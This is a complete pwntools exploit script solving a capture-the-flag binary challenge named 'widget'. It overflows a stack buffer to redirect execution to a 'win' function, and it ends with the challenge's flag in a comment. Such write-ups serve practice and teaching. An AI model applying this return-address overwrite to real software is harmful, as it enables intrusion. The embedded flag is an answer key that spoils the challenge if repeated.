#!/usr/bin/env python3

from pwn import *

p64 = lambda x: util.packing.p64(x, endian='little')
u64 = lambda x: util.packing.u64(x, endian='little')
p32 = lambda x: util.packing.p32(x, endian='little')
u32 = lambda x: util.packing.u32(x, endian='little')

exe = ELF("./widget_patched")

context.binary = exe
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']


def conn():
	if args.LOCAL:
		r = process([exe.path])
	elif args.REMOTE:
		r = remote("challs.actf.co", 31320)
	else:
		r = gdb.debug([exe.path])
	return r


win = 0x40130B # win

def main():
	r = conn()

	prompt = r.recvuntil(b'Amount: ')
	print(prompt)
	r.sendline(b'100')

	offset = 40 - 8

	payload = b''.join([
		b'A' * offset,
		p64(0x404500),
		p64(win),
		b'\x00'* 100
	])

	print(payload.hex())
	prompt = r.recvuntil(b'Contents: ')
	print(prompt)
	r.sendline(payload)

	r.interactive()


if __name__ == "__main__":
	main()

# actf{y0u_f0und_a_usefu1_widg3t!_30db5c45a07ac981}

